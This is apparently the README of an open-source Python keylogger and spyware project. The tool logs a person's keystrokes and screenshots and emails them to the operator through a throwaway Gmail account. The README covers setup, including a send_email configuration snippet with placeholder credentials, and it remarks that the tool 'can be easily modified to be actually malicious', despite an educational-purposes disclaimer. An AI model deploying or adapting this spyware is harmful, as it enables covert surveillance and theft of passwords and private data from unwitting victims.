# Python Keylogger

[![MIT Licence](https://badges.frapsoft.com/os/mit/mit.png?v=103)](https://opensource.org/licenses/mit-license.php)
---                                           

This is a proof-of-concept keylogger and general spyware bundle. It tracks user input and what is currently shown on their screen at regular intervals and sends you the data via email. Given the current implementation for educational purposes it is not using the best approach, but can be easily modified to be actually malicious.


### Requirements: Python 3+

## Usage

In `Start.py`, in the `send_email` function, add the emails on which you want to receive the tracked data in `receiver_emails` and the credentials of the throwaway email that will send you the data in `yag=yagmail.SMTP()`.

Example:

```Python
def send_email():
    receiver_emails = ['receiver-email@outlook.com'] 
    subject = "Keylog Data" + datetime.now().strftime("%d-%m-%Y %H-%M-%S")   
    yag=yagmail.SMTP("sender-email@gmail.com","throwaway123")
```

#### Note: Since most people use Windows, this script has been modified, if you use Linux install PILL linux

## Prerequisites
```sh
$ pip install -r requirements.txt
```

## Usage 

```sh
$ python start.py
```

### Packages
| [`pyautogui`](https://github.com/psf/requests) | PyAutoGUI is a cross-platform GUI automation Python module for human beings. Used to programmatically control the mouse & keyboard.|<br>
| [`pynput`](https://pypi.org/project/pynput/) | This library allows you to control and monitor input devices.|<br>
| [`yagmail`](https://pypi.org/project/yagmail/) | Sending an Email is simple:.|
<br><br> 


### Please note, this repo is for educational purposes only. No contributors, major or minor, are to fault for any actions done by this program.
<br><br> 

---
### 🔓 License 
MIT © [Michael Radu](https://michaelradu.cf) <br>
Don't really understand licenses or tl;dr? Check out the [MIT license summary](https://tldrlegal.com/license/mit-license).
